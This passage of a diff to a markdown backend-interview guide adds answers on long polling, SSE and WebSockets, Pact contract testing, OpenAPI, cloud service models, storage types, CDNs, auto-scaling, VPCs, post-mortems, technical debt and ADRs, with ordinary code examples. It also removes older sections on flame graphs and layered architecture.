+res.set('Link', '</v2/users/:id>; rel="successor-version"');
+
+// Phase 3: Contract — remove old field (after Sunset date)
+app.get('/v2/users/:id', async (req, res) => {
+  const user = await User.findById(req.params.id);
+  res.json({
+    id:        user.id,
+    fullName:  user.fullName,  // "name" field removed
+    firstName: user.firstName,
+    lastName:  user.lastName,
+    email:     user.email,
+    createdAt: user.createdAt,
+  });
+});
 ```
 
-**Reading a real flame graph:**
-
-```
-Wide stack at top = CPU hotspot
-
-Example flame graph analysis:
-┌─────────────────────────────────────[serialize JSON 45%]──────────────────────────┐
-└───────────────────────────────────────────────────────────────────────────────────┘
-
-Finding: JSON.stringify() of huge objects is taking 45% of CPU time!
-
-Fix: 
-1. Reduce object size before serializing
-2. Use faster JSON libraries (fast-json-stringify with schema)
-3. Cache serialized responses
-
-Result after fix: JSON serialization drops to 8% → 5x faster endpoint ✅
-```
-
-> 📖 Reference: [Flame Graphs — Brendan Gregg](https://www.brendangregg.com/flamegraphs.html)
+> 📖 Reference: [API Compatibility — Stripe Blog](https://stripe.com/blog/api-versioning)
 
 ---
 
-## 10. Software Architecture Patterns
-
----
-
-**Q58. What is the Layered (N-Tier) Architecture? What are the typical layers in a backend app?**
+**Q48. What is long polling? How does it compare to WebSockets and SSE (Server-Sent Events)?**
 
 **Answer:**
 
-**Layered architecture** organizes code into horizontal layers where each layer has a specific responsibility and only communicates with the layer directly below it.
+All three solve the problem of pushing real-time updates to clients, but with different trade-offs:
 
-**Typical 4-layer backend structure:**
+| | Long Polling | SSE | WebSocket |
+|--|-------------|-----|----------|
+| Connection | HTTP (open and close per update) | HTTP (persistent, one-way) | TCP (persistent, bidirectional) |
+| Direction | Client initiates; server holds | Server → Client only | Full duplex |
+| Protocol | HTTP/1.1 | HTTP/1.1 or HTTP/2 | WS (ws:// or wss://) |
+| Reconnect | Must re-request | Browser auto-reconnects | Manual reconnect logic |
+| Server complexity | Low | Low | Medium |
+| Scaling | Hard (many held connections) | Medium | Hard (stateful, sticky sessions) |
+| Use case | Simple notifications, legacy | Live feeds, notifications | Chat, games, collaborative editing |
+
+**Long Polling:**
+```js
+// Client keeps asking "any updates?" — server holds the connection open until there are some
+
+// Server: hold connection until event or timeout
+app.get('/poll/notifications', requireAuth, async (req, res) => {
+  const timeout = 30000; // 30 seconds max hold
+  const startTime = Date.now();
+
+  while (Date.now() - startTime < timeout) {
+    const notifications = await getNewNotifications(req.user.id, req.query.since);
+    if (notifications.length > 0) {
+      return res.json({ notifications });
+    }
+    await sleep(1000); // check every 1s
+  }
+  res.json({ notifications: [] }); // timeout, client will re-request
+});
+
+// Client: immediately re-request after getting a response
+async function poll(since = Date.now()) {
+  const response = await fetch(`/poll/notifications?since=${since}`);
+  const { notifications } = await response.json();
+  processNotifications(notifications);
+  poll(Date.now()); // immediately request again
+}
+```
+
+**Server-Sent Events (SSE):**
+```js
+// Server: stream events to client over persistent connection
+app.get('/events/notifications', requireAuth, (req, res) => {
+  res.writeHead(200, {
+    'Content-Type':  'text/event-stream',
+    'Cache-Control': 'no-cache',
+    'Connection':    'keep-alive',
+  });
+
+  // Subscribe to Redis pub/sub
+  const subscriber = redis.duplicate();
+  subscriber.subscribe(`user:${req.user.id}:notifications`);
+
+  subscriber.on('message', (channel, message) => {
+    res.write(`data: ${message}\n\n`); // SSE format
+  });
+
+  // Heartbeat to keep connection alive
+  const heartbeat = setInterval(() => res.write(': heartbeat\n\n'), 30000);
+
+  req.on('close', () => {
+    clearInterval(heartbeat);
+    subscriber.unsubscribe();
+    subscriber.disconnect();
+  });
+});
+
+// Client:
+const eventSource = new EventSource('/events/notifications');
+eventSource.onmessage = (e) => showNotification(JSON.parse(e.data));
+// Browser auto-reconnects if connection drops ✅
+```
+
+**WebSocket:**
+```js
+// Server: bidirectional real-time communication
+const WebSocket = require('ws');
+const wss = new WebSocket.Server({ server });
+
+wss.on('connection', (ws, req) => {
+  const userId = getUserFromCookie(req);
+
+  ws.on('message', (data) => {
+    const message = JSON.parse(data);
+    if (message.type === 'CHAT') {
+      broadcastToRoom(message.roomId, message);
+    }
+  });
+
+  // Push updates to client
+  redis.subscribe(`user:${userId}`, (msg) => ws.send(msg));
+
+  ws.on('close', () => cleanup(userId));
+});
+
+// Client: full two-way communication
+const ws = new WebSocket('wss://api.myapp.com/ws');
+ws.send(JSON.stringify({ type: 'JOIN_ROOM', roomId: 'general' }));
+ws.onmessage = (e) => renderMessage(JSON.parse(e.data));
+```
+
+> 📖 Reference: [Long Polling vs WebSockets — Ably](https://ably.com/topic/long-polling)
+
+---
+
+**Q49. What is an API contract? What is contract testing?**
+
+**Answer:**
+
+An **API contract** is a formal agreement between a provider (service exposing the API) and consumer (service calling it) about what the request and response look like.
+
+**Contract testing** verifies both sides honor the contract, independently — without needing both services running simultaneously.
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│  Presentation Layer  (HTTP, routes, controllers)         │
-│  Handles: request parsing, response formatting, routing  │
-├─────────────────────────────────────────────────────────┤
-│  Business Logic Layer  (services, use cases)             │
-│  Handles: business rules, validation, orchestration      │
-├─────────────────────────────────────────────────────────┤
-│  Data Access Layer  (repositories, DAOs)                 │
-│  Handles: DB queries, ORM, data mapping                  │
-├─────────────────────────────────────────────────────────┤
-│  Infrastructure Layer  (DB, Redis, external APIs)        │
-│  Handles: actual DB connections, third-party calls       │
-└─────────────────────────────────────────────────────────┘
+Without contract testing:
+Order Service assumes:
+  GET /users/:id returns { id, name, email, role }
+
+User Service changes to:
+  GET /users/:id returns { id, fullName, email, permissions }
+  (removed "name", renamed to "fullName", changed "role" to "permissions")
+
+Order Service breaks in production when it calls User Service!
+The change wasn't coordinated — contract was broken silently.
+
+With contract testing:
+Consumer test: "I expect GET /users/:id to return { name, email, role }"
+This contract is uploaded to Pact Broker.
+When User Service changes: "Does this change break any consumer contracts?"
+Pact Broker: "YES — Order Service expects 'name' field, you removed it"
+→ Caught BEFORE deployment ✅
 ```
 
-**Code example:**
+**Pact contract testing example:**
+
+```js
+// ── Consumer (Order Service) — defines what it expects ──────────────
+const { Pact } = require('@pact-foundation/pact');
+
+const provider = new Pact({
+  consumer: 'order-service',
+  provider: 'user-service',
+  port: 1234,
+});
+
+describe('User Service contract', () => {
+  before(() => provider.setup());
+  after(() => provider.finalize());
+
+  it('returns user by ID', async () => {
+    // Define the expected interaction
+    await provider.addInteraction({
+      state: 'user 42 exists',
+      uponReceiving: 'a request for user 42',
+      withRequest: {
+        method: 'GET',
+        path: '/users/42',
+        headers: { Authorization: like('Bearer token') }
+      },
+      willRespondWith: {
+        status: 200,
+        headers: { 'Content-Type': 'application/json' },
+        body: {
+          id:    42,
+          name:  like('Alice'),           // type matching (any string)
+          email: like('alice@example.com'),
+          role:  term({ generate: 'user', matcher: 'user|admin' })
+        }
+      }
+    });
+
+    // Run actual consumer code against mock server
+    const user = await UserServiceClient.getUser(42);
+    expect(user.name).toBeDefined();
+    expect(user.role).toMatch(/user|admin/);
+  });
+});
+// This generates a "pact" file (contract) uploaded to Pact Broker
+
+// ── Provider (User Service) — verifies it satisfies contracts ──────
+const { Verifier } = require('@pact-foundation/pact');
+
+describe('User Service provider verification', () => {
+  it('verifies against consumer contracts', () => {
+    return new Verifier({
+      provider:            'user-service',
+      providerBaseUrl:     'http://localhost:3001',
+      pactBrokerUrl:       'https://pact-broker.company.com',
+      publishVerificationResult: true,
+      // Sets up "user 42 exists" state before running tests
+      stateHandlers: {
+        'user 42 exists': async () => {
+          await db.createTestUser({ id: 42, name: 'Alice', email: 'alice@test.com', role: 'user' });
+        }
+      }
+    }).verifyProvider();
+  });
+});
+// If User Service changes response shape → verification fails → blocked from deploy ✅
+```
+
+> 📖 Reference: [Contract Testing — Pact Docs](https://docs.pact.io/)
+
+---
+
+**Q50. What is an OpenAPI / Swagger specification? Why is it important?**
+
+**Answer:**
+
+**OpenAPI (formerly Swagger)** is a language-agnostic standard for describing REST APIs in a machine-readable YAML/JSON format. It documents endpoints, request/response schemas, authentication, and more.
+
+```yaml
+# openapi.yaml
+openapi: 3.0.3
+info:
+  title:   Order Service API
+  version: 1.0.0
+  description: Manage customer orders
+
+servers:
+  - url: https://api.myapp.com/v1
+
+paths:
+  /orders:
+    post:
+      summary: Create a new order
+      operationId: createOrder
+      security:
+        - bearerAuth: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/CreateOrderRequest'
+            example:
+              userId: 42
+              items:
+                - productId: 1, quantity: 2
+              shippingAddress:
+                street: "123 Main St"
+                city: "New York"
+      responses:
+        '201':
+          description: Order created successfully
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Order'
+        '400':
+          $ref: '#/components/responses/ValidationError'
+        '401':
+          $ref: '#/components/responses/Unauthorized'
+
+components:
+  schemas:
+    Order:
+      type: object
+      required: [id, status, total, createdAt]
+      properties:
+        id:        { type: integer, example: 99 }
+        status:    { type: string, enum: [pending, confirmed, shipped, delivered] }
+        total:     { type: number, format: float, example: 150.00 }
+        createdAt: { type: string, format: date-time }
+
+  securitySchemes:
+    bearerAuth:
+      type: http
+      scheme: bearer
+      bearerFormat: JWT
+```
+
+**Why it's important:**
+
+```js
+// 1. Auto-generate documentation → Swagger UI
+// swagger-ui-express: serve interactive docs
+const swaggerUi = require('swagger-ui-express');
+const spec = require('./openapi.yaml');
+app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(spec));
+// Visit /api-docs → interactive UI, try requests in browser ✅
+
+// 2. Generate client SDKs automatically
+// npx @openapitools/openapi-generator-cli generate \
+//   -i openapi.yaml -g typescript-fetch -o ./sdk/
+// → TypeScript client with all types and methods generated ✅
+
+// 3. Request validation (middleware)
+const OpenApiValidator = require('express-openapi-validator');
+app.use(OpenApiValidator.middleware({
+  apiSpec: './openapi.yaml',
+  validateRequests: true,   // validate all incoming requests against spec
+  validateResponses: true   // validate all outgoing responses against spec
+}));
+// Any request not matching spec → 400 error automatically ✅
+// Any response not matching spec → 500 error (catch schema bugs)
+
+// 4. Contract testing
+// Generate Pact tests from OpenAPI spec
+// Test server-side API against the spec
+// Multiple teams aligned on the same contract
+```
+
+> 📖 Reference: [OpenAPI Specification — Swagger](https://swagger.io/specification/)
+
+---
+
+## 9. Cloud Fundamentals
+
+---
+
+**Q51. What is the difference between IaaS, PaaS, and SaaS?**
+
+**Answer:**
+
+These define how much the cloud provider manages vs. how much you manage:
 
 ```
-project/
-├── routes/        ← Presentation layer
-│   └── users.js
-├── controllers/   ← Presentation layer (request/response handling)
-│   └── userController.js
-├── services/      ← Business logic layer
-│   └── userService.js
-├── repositories/  ← Data access layer
-│   └── userRepository.js
-└── models/        ← Data models / DB schema
-    └── User.js
+On-Premises: You manage EVERYTHING
+IaaS: Cloud manages hardware + networking. You manage OS, runtime, app, data.
+PaaS: Cloud manages hardware + OS + runtime. You manage app + data.
+SaaS: Cloud manages everything. You just use the software.
+```
+
+| | You Manage | Provider Manages | Example |
+|--|-----------|-----------------|---------|
+| **On-Prem** | Everything | Nothing | Your own data center |
+| **IaaS** | OS, Runtime, App, Data | Hardware, Network, Virtualization | AWS EC2, Azure VMs, GCP Compute Engine |
+| **PaaS** | App, Data | OS, Runtime, Middleware, Hardware | Heroku, AWS Elastic Beanstalk, Google App Engine |
+| **SaaS** | Just data/configuration | Everything | Salesforce, Gmail, Slack, GitHub |
+
+**Backend developer perspective:**
+
+```js
+// ── IaaS (EC2): You manage the OS and runtime ──────────────────────
+// SSH into EC2 instance, install Node.js, configure nginx, manage certificates,
+// apply OS patches, set up monitoring, configure firewall...
+// Lots of control, lots of work.
+
+// ── PaaS (Heroku): Just push code ─────────────────────────────────
+// git push heroku main
+// → Heroku detects Node.js, installs deps, starts app, handles routing
+// → Add Heroku Postgres add-on (managed DB)
+// → No SSH, no OS config, no nginx setup
+// → But: less control, can't customize OS
+
+// ── Container PaaS (AWS ECS/GKE): push Docker image ────────────────
+// docker build + push → AWS ECS runs the container
+// You define: CPU/memory requirements, ports, env vars
+// AWS handles: scheduling, health checks, load balancing
+
+// ── Serverless (AWS Lambda): write functions ──────────────────────
+exports.handler = async (event) => {
+  const { userId } = event.pathParameters;
+  const user = await getUserById(userId);
+  return { statusCode: 200, body: JSON.stringify(user) };
+};
+// You write function code. AWS handles: servers, scaling, OS, runtime.
+// Pay per invocation. Auto-scales from 0 to millions.
+// This is more PaaS / FaaS (Function as a Service)
+```
+
+> 📖 Reference: [IaaS vs PaaS vs SaaS — IBM](https://www.ibm.com/topics/iaas-paas-saas)
+
+---
+
+**Q52. What is object storage? How is it different from block storage and file storage?**
+
+**Answer:**
+
+| | Object Storage | Block Storage | File Storage |
+|--|---------------|--------------|-------------|
+| Structure | Flat namespace, key-value (buckets/objects) | Raw blocks (like a hard drive) | Hierarchical filesystem |
+| Access | HTTP APIs (REST) | Mounted as disk via iSCSI/NVMe | NFS, SMB/CIFS mount |
+| Metadata | Rich custom metadata per object | Minimal | Directory attributes |
+| Use case | Images, videos, backups, static assets | DB data files, VM disks | Shared filesystems, NAS |
+| Scalability | Effectively unlimited | Limited to single disk size | Limited |
+| AWS | S3 | EBS | EFS |
+
+```js
+// ── Object Storage (S3) — HTTP access, immutable objects ─────────────
+const { S3Client, PutObjectCommand, GetObjectCommand } = require('@aws-sdk/client-s3');
+const s3 = new S3Client({ region: 'us-east-1' });
+
+// Upload user avatar (object = key + data + metadata)
+await s3.send(new PutObjectCommand({
+  Bucket:      'my-app-avatars',
+  Key:         `users/${userId}/avatar.jpg`,    // flat namespace (no real directory)
+  Body:        imageBuffer,
+  ContentType: 'image/jpeg',
+  Metadata:    { userId: userId.toString(), uploadedAt: new Date().toISOString() },
+  ACL:         'public-read'
+}));
+
+// Objects are immutable: to "update", you upload a new object with the same key
+// Object URL: https://my-app-avatars.s3.amazonaws.com/users/42/avatar.jpg
+
+// ── Block Storage (EBS) — mounted as disk, mutable in place ──────────
+// EC2 instance has /dev/xvda (root volume, EBS block storage)
+// Database (PostgreSQL) stores its data files on EBS
+// Files can be read/written/modified at the byte level
+// Fast random access → good for databases
+
+// ── File Storage (EFS) — shared filesystem ───────────────────────────
+// Multiple EC2 instances mount the same EFS filesystem at /efs
+// Files are shared — all instances see the same files
+// Good for: shared config files, CMS media, legacy apps expecting NFS
+// Slower than EBS, but accessible from multiple instances
+```
+
+**When to use object storage in backend:**
+- User-uploaded files (avatars, documents, images, videos).
+- Static website assets served via CDN.
+- Application logs, backups, data exports.
+- Data lake raw storage.
+- ML training datasets.
+
+> 📖 Reference: [Storage Types — AWS](https://aws.amazon.com/what-is/object-storage/)
+
+---
+
+**Q53. What is a CDN (Content Delivery Network)? How does it improve backend performance?**
+
+**Answer:**
+
+A **CDN** is a globally distributed network of servers ("edge nodes") that cache and serve content from the location closest to the user — reducing latency by avoiding long-distance network hops to your origin server.
+
+```
+Without CDN:
+User in Mumbai → requests image → travels to US-East server → response → Mumbai
+Round trip: ~250ms
+
+With CDN (Cloudflare/CloudFront):
+User in Mumbai → requests image → Cloudflare Mumbai edge node → cached → response
+Round trip: ~10ms (99% of the time, image was already cached locally)
+Origin server never contacted for cached content ✅
+```
+
+**What CDNs cache and what they don't:**
+
+```js
+// ── Cache static assets at CDN (forever or long TTL) ─────────────────
+// HTML: cache-busted by content hash in filename
+// e.g., app.a3f2b9c1.js, style.7d8e9f0a.css
+app.use('/static', express.static('public', {
+  maxAge: '1y',              // browser caches for 1 year
+  setHeaders: (res) => {
+    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
+    // CDN caches for 1 year. Browser caches for 1 year.
+    // Next deploy: new file hash → new URL → cache automatically busted
+  }
+}));
+
+// ── Cache API responses at CDN (short TTL) ────────────────────────────
+app.get('/api/products', async (req, res) => {
+  const products = await getProducts();
+  res.set('Cache-Control', 'public, max-age=60, s-maxage=300');
+  // max-age=60:    browser caches 1 minute
+  // s-maxage=300:  CDN (shared cache) caches 5 minutes
+  res.json(products);
+});
+
+// ── Never cache at CDN ────────────────────────────────────────────────
+app.get('/api/user/profile', requireAuth, async (req, res) => {
+  const user = await getUser(req.user.id);
+  res.set('Cache-Control', 'private, no-store');
+  // private: CDN won't cache (user-specific data)
+  // no-store: browser won't cache either
+  res.json(user);
+});
+
+// ── CDN as DDoS protection ────────────────────────────────────────────
+// Cloudflare absorbs DDoS at edge, only legitimate traffic reaches origin
+// Bot detection, WAF rules applied at edge
+// Origin IP is never exposed (attackers can't bypass CDN)
+```
+
+**CDN benefits for backend:**
+- Offload 80-99% of static asset requests from origin servers.
+- Reduce origin server bandwidth costs.
+- DDoS mitigation at the edge.
+- SSL termination at edge (faster TLS handshake).
+- Global low-latency for a worldwide user base.
+
+> 📖 Reference: [CDN — Cloudflare](https://www.cloudflare.com/learning/cdn/what-is-a-cdn/)
+
+---
+
+**Q54. What is auto-scaling? What is the difference between scheduled and dynamic scaling?**
+
+**Answer:**
+
+**Auto-scaling** automatically adjusts the number of compute instances (EC2, pods, containers) based on demand — scaling out when load increases, scaling in when it decreases.
+
+| | Scheduled Scaling | Dynamic Scaling |
+|--|------------------|----------------|
+| Trigger | Time-based (cron schedule) | Metric-based (CPU, RPS, queue depth) |
+| Predictability | Works for predictable traffic patterns | Works for unpredictable spikes |
+| Reaction time | Pre-emptive (scales before load arrives) | Reactive (scales after load detected) |
+| Use case | Business hours, weekly patterns | Flash sales, viral traffic |
+
+```python
+# ── AWS Auto Scaling: scheduled ────────────────────────────────────────
+import boto3
+autoscaling = boto3.client('autoscaling')
+
+# Scale up Monday-Friday at 8 AM EST (before business hours)
+autoscaling.put_scheduled_update_group_action(
+    AutoScalingGroupName='api-asg',
+    ScheduledActionName='scale-up-business-hours',
+    Recurrence='0 13 * * MON-FRI',  # 8 AM EST = 13 UTC
+    DesiredCapacity=20,
+    MinSize=10
+)
+
+# Scale down at 8 PM EST (after business hours)
+autoscaling.put_scheduled_update_group_action(
+    AutoScalingGroupName='api-asg',
+    ScheduledActionName='scale-down-off-hours',
+    Recurrence='0 1 * * *',   # 1 AM UTC = 8 PM EST
+    DesiredCapacity=3,
+    MinSize=2
+)
+```
+
+```yaml
+# ── Kubernetes HPA: dynamic (CPU-based) ─────────────────────────────
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
+metadata:
+  name: api-hpa
+spec:
+  scaleTargetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: api
+  minReplicas: 3
+  maxReplicas: 50
+  metrics:
+  - type: Resource
+    resource:
+      name: cpu
+      target:
+        type: Utilization
+        averageUtilization: 60  # scale when avg CPU > 60%
+  behavior:
+    scaleUp:
+      stabilizationWindowSeconds: 60   # don't scale up more than once/min
+      policies:
+      - type: Percent
+        value: 100              # can double pods in one step
+        periodSeconds: 60
+    scaleDown:
+      stabilizationWindowSeconds: 300  # wait 5 min before scaling down
+      policies:
+      - type: Pods
+        value: 2                # remove at most 2 pods at a time
+        periodSeconds: 60
+```
+
+**Combine both:**
+```
+Scheduled: pre-scale to 20 pods at 8 AM (known daily pattern)
+Dynamic: if a viral spike hits at noon → auto-scales beyond the scheduled 20
+Best of both worlds: predictable baseline + elastic spike handling
+```
+
+> 📖 Reference: [Auto Scaling — AWS](https://aws.amazon.com/autoscaling/)
+
+---
+
+**Q55. What is a VPC (Virtual Private Cloud)? Why do production backends run inside one?**
+
+**Answer:**
+
+A **VPC** is a logically isolated section of the cloud where you define your own virtual network — IP ranges, subnets, routing tables, and security groups. It's like having your own private data center within AWS.
+
+```
+Without VPC:
+Your RDS database has a public IP → Anyone on the internet can try to connect!
+Your Redis → exposed to internet → security nightmare
+
+With VPC:
+Internet → Internet Gateway → Public Subnet (load balancer only)
+                                        ↓
+                              Private Subnet (app servers)
+                                        ↓
+                              Private Subnet (databases, Redis)
+                              ← No internet access! Only accessible within VPC ✅
+```
+
+```
+VPC Architecture (production):
+┌─────────────────────────────────────────────────────────────────┐
+│  VPC: 10.0.0.0/16                                               │
+│                                                                  │
+│  ┌─────────────────────────────────────────────────────┐        │
+│  │  Public Subnet 10.0.1.0/24 (us-east-1a)             │        │
+│  │  Load Balancer (internet-facing)                     │        │
+│  │  Bastion host (SSH jump server)                      │        │
+│  └─────────────────────────────────────────────────────┘        │
+│                         ↕                                        │
+│  ┌─────────────────────────────────────────────────────┐        │
+│  │  Private Subnet 10.0.2.0/24 (us-east-1a)            │        │
+│  │  API servers (EC2 / ECS tasks)                       │        │
+│  │  → Can reach internet via NAT Gateway (for npm install)│      │
+│  │  → NOT reachable from internet directly              │        │
+│  └─────────────────────────────────────────────────────┘        │
+│                         ↕                                        │
+│  ┌─────────────────────────────────────────────────────┐        │
+│  │  Private Subnet 10.0.3.0/24 (us-east-1a)            │        │
+│  │  RDS PostgreSQL (no public IP!)                      │        │
+│  │  ElastiCache Redis (no public IP!)                   │        │
+│  │  → Only accessible from Private Subnet above         │        │
+│  └─────────────────────────────────────────────────────┘        │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+```hcl
+# Terraform VPC setup
+resource "aws_vpc" "main" {
+  cidr_block = "10.0.0.0/16"
+  enable_dns_hostnames = true
+}
+
+resource "aws_subnet" "public" {
+  vpc_id                  = aws_vpc.main.id
+  cidr_block              = "10.0.1.0/24"
+  map_public_ip_on_launch = true
+}
+
+resource "aws_subnet" "private_app" {
+  vpc_id     = aws_vpc.main.id
+  cidr_block = "10.0.2.0/24"
+}
+
+resource "aws_subnet" "private_db" {
+  vpc_id     = aws_vpc.main.id
+  cidr_block = "10.0.3.0/24"
+}
+
+# Security group: only allow DB access from app subnet
+resource "aws_security_group" "rds" {
+  vpc_id = aws_vpc.main.id
+  ingress {
+    from_port       = 5432
+    to_port         = 5432
+    protocol        = "tcp"
+    security_groups = [aws_security_group.app.id]  # only from app servers ✅
+  }
+  # No ingress from internet!
+}
+```
+
+> 📖 Reference: [VPC — AWS Docs](https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html)
+
+---
+
+## 10. Engineering Practices & Team Collaboration
+
+---
+
+**Q56. What is a post-mortem / incident review? What makes a good blameless post-mortem?**
+
+**Answer:**
+
+A **post-mortem** (or incident review) is a structured analysis conducted after an incident (outage, data loss, security breach) to understand what happened, why it happened, and how to prevent it in future.
+
+**Blameless** means: the goal is to improve systems and processes, NOT to find and punish the person who made a mistake.
+
+```
+Why blameless matters:
+If people fear blame, they hide problems, don't report near-misses, don't take ownership.
+Blameless culture: people share openly → better learning → fewer future incidents.
+"The system allowed this mistake to happen. How do we fix the system?"
+
+Google's SRE principle:
+"Individuals don't cause incidents — system design and processes do."
+```
+
+**Good post-mortem structure:**
+
+```markdown
+# Incident Post-Mortem: Payment Service Outage
+**Date:** 2024-06-01 | **Duration:** 47 minutes | **Severity:** P1
+**Author:** [name] | **Reviewers:** [names]
+
+## Impact
+- 23,000 payment attempts failed
+- $180,000 in lost revenue
+- 3 enterprise customers affected
+
+## Timeline (UTC)
+- 14:23 — Deploy v2.4.1 to production
+- 14:31 — Alert fires: payment error rate > 5%
+- 14:35 — On-call engineer paged, begins investigation
+- 14:42 — Root cause identified: connection pool exhaustion
+- 15:03 — Rollback to v2.4.0 complete
+- 15:10 — Error rate returns to normal
+
+## Root Cause
+v2.4.1 introduced a database query that held connections open
+for the duration of a long Stripe API call (avg 3s).
+With 20 max connections and ~10 req/sec, pool exhausted in ~2 min.
+The connection was NOT released in the finally block (programmer oversight).
+
+## Contributing Factors
+- No connection timeout configured (allowed connections to be held indefinitely)
+- Load testing didn't simulate Stripe API latency
+- Code review missed the missing finally block
+
+## What Went Well
+- Alert fired within 8 minutes of deploy
+- On-call engineer identified root cause in 7 minutes
+- Rollback completed in 21 minutes
+
+## Action Items
+| Action | Owner | Due |
+|--------|-------|-----|
+| Add connection timeout to DB config (5s max) | @devA | June 3 |
+| Add connection hold time to deployment dashboard | @devB | June 5 |
+| Add Stripe latency simulation to load test | @devC | June 8 |
+| Add "connection released in finally?" to code review checklist | @teamLead | June 3 |
+
+## Lessons Learned
+Connection pools need timeouts. Load tests must simulate realistic 3rd-party latencies.
+Checklist items catch patterns that reviews miss.
+```
+
+> 📖 Reference: [Blameless Post-Mortems — Google SRE Book](https://sre.google/sre-book/postmortem-culture/)
+
+---
+
+**Q57. What is technical debt? How do you communicate it to non-technical stakeholders?**
+
+**Answer:**
+
+**Technical debt** is the implied cost of future rework caused by choosing an expedient (quick/easy) solution now instead of a better long-term approach.
+
+```
+Like financial debt:
+Taking a shortcut = borrowing against the future
+The "interest" = increasing maintenance cost, slower feature development, more bugs
+
+Types:
+Deliberate (intentional): "We'll do this properly after launch"
+Inadvertent: "We didn't know better at the time"
+Bit rot: Code that was fine but environment changed around it
+```
+
+**Communicating to non-technical stakeholders:**
+
+```
+❌ Technical framing (they don't care):
+"Our authentication module uses deprecated OAuth 1.0 and the JWT library is 3 major versions
+behind. The user service has cyclomatic complexity of 42 and zero unit test coverage."
+
+✅ Business impact framing:
+"Our login system has accumulated shortcuts that are now causing problems:
+  - It takes 3x longer to add new sign-in methods (email, SSO, etc.) than it should
+  - It's the #1 source of security bug reports this quarter
+  - Our last security audit flagged it as high risk
+  - Fixing it properly: 6 weeks of work
+  - NOT fixing it: every new auth feature takes 3 weeks instead of 1, risk of breach"
+
+Frame as:
+→ Velocity impact: "Feature X takes 3 weeks instead of 1 because of Y"
+→ Risk: "If left unaddressed, risk of [incident] increases by Z%"
+→ Cost: "We'll spend $X in maintenance over 12 months vs $Y to fix now"
+→ ROI: "Fixing this enables us to ship [business feature] 2 months earlier"
 ```
 
 ```js
-// ── routes/users.js (Presentation) ──────────────────────────────────
-router.post('/users',
-  validate(createUserSchema),
-  userController.create
-);
+// Tracking technical debt systematically
+// Option 1: Dedicated tickets/epic in your issue tracker
+// Label: "tech-debt" | Priority: Medium | Estimate: 3 weeks
 
-// ── controllers/userController.js (Presentation) ──────────────────
-const create = async (req, res, next) => {
-  try {
-    const user = await userService.createUser(req.body);  // calls service
-    res.status(201).json({ data: user });
-  } catch (err) {
-    next(err);
-  }
-};
+// Option 2: TODO/FIXME comments with ticket references
+// TODO(TECH-123): Replace with proper retry logic using exponential backoff
+// FIXME(TECH-456): This O(n²) loop needs to be refactored before user count > 10K
 
-// ── services/userService.js (Business Logic) ─────────────────────
-async function createUser({ name, email, password }) {
-  // Business rule: email must be unique
-  const existing = await userRepository.findByEmail(email);
-  if (existing) throw new ConflictError('Email already registered');
+// Option 3: Architecture Decision Records (ADR)
+// "We chose X knowing it has these limitations.
+//  When [condition] is met, we should revisit and migrate to Y."
+```
 
-  // Business rule: hash password
-  const passwordHash = await bcrypt.hash(password, 12);
+> 📖 Reference: [Technical Debt — Martin Fowler](https://martinfowler.com/bliki/TechnicalDebt.html)
 
-  // Orchestrate: create user + send welcome email
-  const user = await userRepository.create({ name, email, passwordHash });
-  await emailService.sendWelcome(user);  // calls another service
+---
 
-  return user;
-}
+**Q58. What is an Architecture Decision Record (ADR)? Why should teams write them?**
 
-// ── repositories/userRepository.js (Data Access) ─────────────────
-async function create(userData) {
-  const result = await db.query(
-    'INSERT INTO users (name, email, password_hash) VALUES ($1, $2, $3) RETURNING *',
-    [userData.name, userData.email, userData.passwordHash]
-  );
-  return result.rows[0];
-}
+**Answer:**
 
-async function findByEmail(email) {
-  const result = await db.query('SELECT * FROM users WHERE email = $1', [email]);
-  return result.rows[0] || null;
-}
+An **ADR** is a short document that captures an architectural decision — what was decided, why, and what alternatives were considered. It creates a durable record of why the system looks the way it does.
+
+```
+Without ADRs (6 months later):
+"Why are we using RabbitMQ instead of Kafka?"
+"Why is the auth service written in Go while everything else is Node.js?"
+→ Nobody remembers. The original decision-maker left. No documentation.
+→ Team debates the same question again. Wasted time.
+
+With ADRs:
+"Why RabbitMQ?" → Look up ADR-042: "At the time, team had RabbitMQ expertise and
+the throughput was sufficient. Kafka was rejected because it required a ZooKeeper
+cluster we weren't ready to operate. Revisit if message volume exceeds 50K/sec."
+→ Instant clarity. Context preserved. Faster onboarding.
+```
+
+**ADR template:**
+
+```markdown
+# ADR-042: Use RabbitMQ for Task Queue
+
+## Status
+Accepted (2024-03-15)
+
+## Context
+We need a message broker to decouple background jobs (email sending, report generation)
+from request processing. The system processes ~500 tasks/second at peak.
+
+## Decision
+We will use RabbitMQ (not Kafka, not Redis Streams) as our primary task queue.
+
+## Rationale
+- Team has 3 engineers with RabbitMQ experience
+- Throughput requirement (500/s) is well within RabbitMQ's capabilities
+- RabbitMQ has superior support for complex routing (exchanges, bindings)
+  which we need for per-customer worker isolation
+- Managed offering available on CloudAMQP
+
+## Alternatives Considered
+
+### Apache Kafka
+- Rejected: overkill for our use case; requires ZooKeeper/KRaft cluster
+  we don't have operational expertise for
+- Rejected: log-based model unsuitable for tasks we want deleted after ACK
+- Revisit if: throughput > 50K/sec OR we need event replay/stream processing
+
+### Redis Streams
+- Rejected: Redis is our cache; mixing caching and queuing creates risk
+- Rejected: less mature consumer group management
+- Rejected: limited routing capabilities
+
+### AWS SQS
+- Considered: simpler operationally, but limited routing and no local dev support
+- May revisit if we migrate fully to AWS-native stack
+
+## Consequences
+- Team must maintain RabbitMQ cluster (or use CloudAMQP managed service)
+- All new async work should go through RabbitMQ
+- If throughput grows beyond ~10K/sec, revisit Kafka migration
+
+## Review Date
+2025-03-15 (annual review)
+```
+
+> 📖 Reference: [ADRs — Michael Nygard](https://cognitect.com/blog/2011/11/15/documenting-architecture-decisions)
+
+---
+
+**Q59. What is pair programming? What are its benefits and when is it not appropriate?**
+
+**Answer:**
+
+**Pair programming** is a practice where two developers work together at a single workstation — one writes code (driver), the other reviews and guides (navigator). Roles switch regularly.
+
+```
+Driver:    writes code, focuses on implementation details
+Navigator: watches, thinks about design, catches bugs, suggests approaches, checks docs
+
